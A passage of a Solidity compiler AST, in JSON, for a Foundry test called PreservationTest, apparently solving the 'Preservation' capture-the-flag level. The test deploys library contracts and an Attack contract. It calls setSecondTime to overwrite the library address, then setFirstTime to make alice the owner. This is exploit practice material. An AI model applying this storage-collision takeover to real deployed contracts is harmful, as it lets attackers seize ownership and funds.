                "typeIdentifier": "t_contract$_Attack_$24220",
                "typeString": "contract Attack"
              }
            },
            "visibility": "public"
          },
          {
            "id": 24240,
            "nodeType": "VariableDeclaration",
            "src": "801:20:18",
            "constant": false,
            "functionSelector": "fb47e3a2",
            "mutability": "mutable",
            "name": "alice",
            "nameLocation": "816:5:18",
            "scope": 24327,
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 24239,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "801:7:18",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "visibility": "public"
          },
          {
            "id": 24287,
            "nodeType": "FunctionDefinition",
            "src": "828:288:18",
            "body": {
              "id": 24286,
              "nodeType": "Block",
              "src": "852:264:18",
              "statements": [
                {
                  "expression": {
                    "id": 24248,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 24243,
                      "name": "timezone1",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 24232,
                      "src": "902:9:18",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_LibraryContract_$23898",
                        "typeString": "contract LibraryContract"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [],
                      "expression": {
                        "argumentTypes": [],
                        "id": 24246,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "NewExpression",
                        "src": "914:19:18",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_creation_nonpayable$__$returns$_t_contract$_LibraryContract_$23898_$",
                          "typeString": "function () returns (contract LibraryContract)"
                        },
                        "typeName": {
                          "id": 24245,
                          "nodeType": "UserDefinedTypeName",
                          "pathNode": {
                            "id": 24244,
                            "name": "LibraryContract",
                            "nodeType": "IdentifierPath",
                            "referencedDeclaration": 23898,
                            "src": "918:15:18"
                          },
                          "referencedDeclaration": 23898,
                          "src": "918:15:18",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_LibraryContract_$23898",
                            "typeString": "contract LibraryContract"
                          }
                        }
                      },
                      "id": 24247,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "914:21:18",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_LibraryContract_$23898",
                        "typeString": "contract LibraryContract"
                      }
                    },
                    "src": "902:33:18",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_LibraryContract_$23898",
                      "typeString": "contract LibraryContract"
                    }
                  },
                  "id": 24249,
                  "nodeType": "ExpressionStatement",
                  "src": "902:33:18"
                },
                {
                  "expression": {
                    "id": 24255,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 24250,
                      "name": "timezone2",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 24235,
                      "src": "945:9:18",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_LibraryContract_$23898",
                        "typeString": "contract LibraryContract"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [],
                      "expression": {
                        "argumentTypes": [],
                        "id": 24253,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "NewExpression",
                        "src": "957:19:18",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_creation_nonpayable$__$returns$_t_contract$_LibraryContract_$23898_$",
                          "typeString": "function () returns (contract LibraryContract)"
                        },
                        "typeName": {
                          "id": 24252,
                          "nodeType": "UserDefinedTypeName",
                          "pathNode": {
                            "id": 24251,
                            "name": "LibraryContract",
                            "nodeType": "IdentifierPath",
                            "referencedDeclaration": 23898,
                            "src": "961:15:18"
                          },
                          "referencedDeclaration": 23898,
                          "src": "961:15:18",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_LibraryContract_$23898",
                            "typeString": "contract LibraryContract"
                          }
                        }
                      },
                      "id": 24254,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "957:21:18",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_LibraryContract_$23898",
                        "typeString": "contract LibraryContract"
                      }
                    },
                    "src": "945:33:18",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_LibraryContract_$23898",
                      "typeString": "contract LibraryContract"
                    }
                  },
                  "id": 24256,
                  "nodeType": "ExpressionStatement",
                  "src": "945:33:18"
                },
                {
                  "expression": {
                    "id": 24262,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 24257,
                      "name": "alice",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 24240,
                      "src": "989:5:18",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "hexValue": "31",
                          "id": 24260,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "1005:1:18",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1_by_1",
                            "typeString": "int_const 1"
                          },
                          "value": "1"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_1_by_1",
                            "typeString": "int_const 1"
                          }
                        ],
                        "expression": {
                          "id": 24258,
                          "name": "vm",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1817,
                          "src": "997:2:18",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_Vm_$7098",
                            "typeString": "contract Vm"
                          }
                        },
                        "id": 24259,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "addr",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 6390,
                        "src": "997:7:18",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$_t_address_$",
                          "typeString": "function (uint256) external returns (address)"
                        }
                      },
                      "id": 24261,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "997:10:18",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "989:18:18",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 24263,
                  "nodeType": "ExpressionStatement",
                  "src": "989:18:18"
                },
                {
                  "expression": {
                    "id": 24277,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 24264,
                      "name": "pr",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 24229,
                      "src": "1017:2:18",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Preservation_$23885",
                        "typeString": "contract Preservation"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "arguments": [
                            {
                              "id": 24270,
                              "name": "timezone1",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 24232,
                              "src": "1047:9:18",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_LibraryContract_$23898",
                                "typeString": "contract LibraryContract"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_LibraryContract_$23898",
                                "typeString": "contract LibraryContract"
                              }
                            ],
                            "id": 24269,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "1039:7:18",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 24268,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "1039:7:18",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 24271,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1039:18:18",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        {
                          "arguments": [
                            {
                              "id": 24274,
                              "name": "timezone2",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 24235,
                              "src": "1067:9:18",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_LibraryContract_$23898",
                                "typeString": "contract LibraryContract"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_LibraryContract_$23898",
                                "typeString": "contract LibraryContract"
                              }
                            ],
                            "id": 24273,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "1059:7:18",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 24272,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "1059:7:18",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 24275,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1059:18:18",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          },
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 24267,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "NewExpression",
                        "src": "1022:16:18",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_creation_nonpayable$_t_address_$_t_address_$returns$_t_contract$_Preservation_$23885_$",
                          "typeString": "function (address,address) returns (contract Preservation)"
                        },
                        "typeName": {
                          "id": 24266,
                          "nodeType": "UserDefinedTypeName",
                          "pathNode": {
                            "id": 24265,
                            "name": "Preservation",
                            "nodeType": "IdentifierPath",
                            "referencedDeclaration": 23885,
                            "src": "1026:12:18"
                          },
                          "referencedDeclaration": 23885,
                          "src": "1026:12:18",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_Preservation_$23885",
                            "typeString": "contract Preservation"
                          }
                        }
                      },
                      "id": 24276,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1022:56:18",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Preservation_$23885",
                        "typeString": "contract Preservation"
                      }
                    },
                    "src": "1017:61:18",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Preservation_$23885",
                      "typeString": "contract Preservation"
                    }
                  },
                  "id": 24278,
                  "nodeType": "ExpressionStatement",
                  "src": "1017:61:18"
                },
                {
                  "expression": {
                    "id": 24284,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 24279,
                      "name": "attack",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 24238,
                      "src": "1088:6:18",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Attack_$24220",
                        "typeString": "contract Attack"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [],
                      "expression": {
                        "argumentTypes": [],
                        "id": 24282,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "NewExpression",
                        "src": "1097:10:18",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_creation_nonpayable$__$returns$_t_contract$_Attack_$24220_$",
                          "typeString": "function () returns (contract Attack)"
                        },
                        "typeName": {
                          "id": 24281,
                          "nodeType": "UserDefinedTypeName",
                          "pathNode": {
                            "id": 24280,
                            "name": "Attack",
                            "nodeType": "IdentifierPath",
                            "referencedDeclaration": 24220,
                            "src": "1101:6:18"
                          },
                          "referencedDeclaration": 24220,
                          "src": "1101:6:18",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_Attack_$24220",
                            "typeString": "contract Attack"
                          }
                        }
                      },
                      "id": 24283,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1097:12:18",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Attack_$24220",
                        "typeString": "contract Attack"
                      }
                    },
                    "src": "1088:21:18",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Attack_$24220",
                      "typeString": "contract Attack"
                    }
                  },
                  "id": 24285,
                  "nodeType": "ExpressionStatement",
                  "src": "1088:21:18"
                }
              ]
            },
            "functionSelector": "0a9254e4",
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "setUp",
            "nameLocation": "837:5:18",
            "parameters": {
              "id": 24241,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "842:2:18"
            },
            "returnParameters": {
              "id": 24242,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "852:0:18"
            },
            "scope": 24327,
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "id": 24326,
            "nodeType": "FunctionDefinition",
            "src": "1122:534:18",
            "body": {
              "id": 24325,
              "nodeType": "Block",
              "src": "1151:505:18",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 24297,
                                "name": "attack",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 24238,
                                "src": "1379:6:18",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_Attack_$24220",
                                  "typeString": "contract Attack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_Attack_$24220",
                                  "typeString": "contract Attack"
                                }
                              ],
                              "id": 24296,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "1371:7:18",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 24295,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "1371:7:18",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 24298,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "1371:15:18",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 24294,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1363:7:18",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_uint160_$",
                            "typeString": "type(uint160)"
                          },
                          "typeName": {
                            "id": 24293,
                            "name": "uint160",
                            "nodeType": "ElementaryTypeName",
                            "src": "1363:7:18",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 24299,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1363:24:18",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint160",
                          "typeString": "uint160"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint160",
                          "typeString": "uint160"
                        }
                      ],
                      "expression": {
                        "id": 24290,
                        "name": "pr",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 24229,
                        "src": "1346:2:18",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_Preservation_$23885",
                          "typeString": "contract Preservation"
                        }
                      },
                      "id": 24292,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "setSecondTime",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 23884,
                      "src": "1346:16:18",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
                        "typeString": "function (uint256) external"
                      }
                    },
                    "id": 24300,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1346:42:18",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 24301,
                  "nodeType": "ExpressionStatement",
                  "src": "1346:42:18"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 24305,
                            "name": "attack",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 24238,
                            "src": "1416:6:18",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Attack_$24220",
                              "typeString": "contract Attack"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_Attack_$24220",
                              "typeString": "contract Attack"
                            }
                          ],
                          "id": 24304,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1408:7:18",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 24303,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "1408:7:18",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 24306,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1408:15:18",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [],
                        "expression": {
                          "argumentTypes": [],
                          "expression": {
                            "id": 24307,
                            "name": "pr",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 24229,
                            "src": "1425:2:18",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Preservation_$23885",
                              "typeString": "contract Preservation"
                            }
                          },
                          "id": 24308,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "timeZone1Library",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 23817,
                          "src": "1425:19:18",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
                            "typeString": "function () view external returns (address)"
                          }
                        },
                        "id": 24309,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1425:21:18",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      ],
                      "id": 24302,
                      "name": "assertEq",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        3167,
                        3192,
                        3205,
                        3221,
                        3263,
                        3305,
                        3347,
                        3384,
                        3421,
                        3458,
                        320,
                        345,
                        375,
                        400,
                        459,
                        484,
                        514,
                        539,
                        1639,
                        1674
                      ],
                      "referencedDeclaration": 320,
                      "src": "1399:8:18",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$returns$__$",
                        "typeString": "function (address,address)"
                      }
                    },
                    "id": 24310,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1399:48:18",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 24311,
                  "nodeType": "ExpressionStatement",
                  "src": "1399:48:18"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "hexValue": "31",
                        "id": 24315,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1609:1:18",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_1_by_1",
                          "typeString": "int_const 1"
                        },
                        "value": "1"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_rational_1_by_1",
                          "typeString": "int_const 1"
                        }
                      ],
                      "expression": {
                        "id": 24312,
                        "name": "pr",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 24229,
                        "src": "1593:2:18",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_Preservation_$23885",
                          "typeString": "contract Preservation"
                        }
                      },
                      "id": 24314,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "setFirstTime",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 23868,
                      "src": "1593:15:18",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
                        "typeString": "function (uint256) external"
                      }
                    },
                    "id": 24316,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1593:18:18",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 24317,
                  "nodeType": "ExpressionStatement",
                  "src": "1593:18:18"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 24319,
                        "name": "alice",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 24240,
                        "src": "1631:5:18",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [],
                        "expression": {
                          "argumentTypes": [],
                          "expression": {
                            "id": 24320,
                            "name": "pr",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 24229,
                            "src": "1638:2:18",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Preservation_$23885",
                              "typeString": "contract Preservation"
                            }
                          },
                          "id": 24321,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "owner",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 23821,
                          "src": "1638:8:18",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
                            "typeString": "function () view external returns (address)"
                          }
                        },
                        "id": 24322,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1638:10:18",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      ],
                      "id": 24318,
                      "name": "assertEq",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        3167,
                        3192,
                        3205,
                        3221,
                        3263,
                        3305,
                        3347,
                        3384,
                        3421,
                        3458,
                        320,
                        345,
                        375,
                        400,
                        459,
                        484,
                        514,
                        539,
                        1639,
                        1674
                      ],
                      "referencedDeclaration": 320,
                      "src": "1622:8:18",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$returns$__$",
                        "typeString": "function (address,address)"
                      }
                    },
                    "id": 24323,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1622:27:18",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 24324,
                  "nodeType": "ExpressionStatement",
                  "src": "1622:27:18"
                }
              ]
            },
            "functionSelector": "6f2db99c",
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "testAttack",
            "nameLocation": "1131:10:18",
            "parameters": {
              "id": 24288,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1141:2:18"
            },
            "returnParameters": {
              "id": 24289,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1151:0:18"
            },
            "scope": 24327,
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          }
        ],
        "abstract": false,
        "baseContracts": [
          {
            "baseName": {
              "id": 24221,
              "name": "Test",
              "nodeType": "IdentifierPath",
              "referencedDeclaration": 4979,
              "src": "622:4:18"
            },
            "id": 24222,
            "nodeType": "InheritanceSpecifier",
            "src": "622:4:18"
          }
        ],
        "canonicalName": "PreservationTest",
        "contractDependencies": [
          23885,
          23898,
          24220
        ],
        "contractKind": "contract",
        "fullyImplemented": true,
        "linearizedBaseContracts": [
          24327,
          4979,
          2049,
          1786
        ],
        "name": "PreservationTest",
        "nameLocation": "602:16:18",
        "scope": 24328,
        "usedErrors": []
      }
    ],
    "license": "UNLICENSED"
  },
  "id": 18
}